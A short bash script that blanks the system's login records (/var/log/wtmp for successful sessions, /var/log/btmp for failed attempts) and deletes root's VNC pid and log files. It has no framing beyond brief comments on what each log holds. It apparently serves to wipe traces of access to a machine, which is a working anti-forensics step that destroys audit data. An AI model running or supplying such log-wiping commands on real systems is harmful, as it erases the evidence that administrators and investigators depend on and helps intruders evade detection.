#!/bin/bash

#/var/log/wtmp records successful login/logout sessions (last reads it).
echo " " > /var/log/wtmp                              

#/var/log/btmp records failed login attempts (lastb reads it).
echo " " > /var/log/btmp

rm /root/.vnc/*.pid && rm /root/.vnc/*.log
